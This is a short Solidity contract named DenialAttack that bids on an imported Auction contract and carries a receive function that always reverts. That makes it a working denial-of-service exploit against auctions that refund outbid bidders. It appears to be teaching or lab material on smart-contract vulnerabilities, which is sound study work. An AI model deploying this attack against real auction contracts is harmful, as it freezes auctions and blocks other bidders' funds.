// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "./auction.sol";

contract DenialAttack {
    
    Auction auctionContract;

    constructor(Auction auctionAddress) {
        auctionContract = Auction(auctionAddress);
    }

    receive() external payable {
        assert(false);
    }

    function bid() public payable {
        auctionContract.bid{value: msg.value}();
    }

    function claim() public payable {
        auctionContract.claim();
    }
}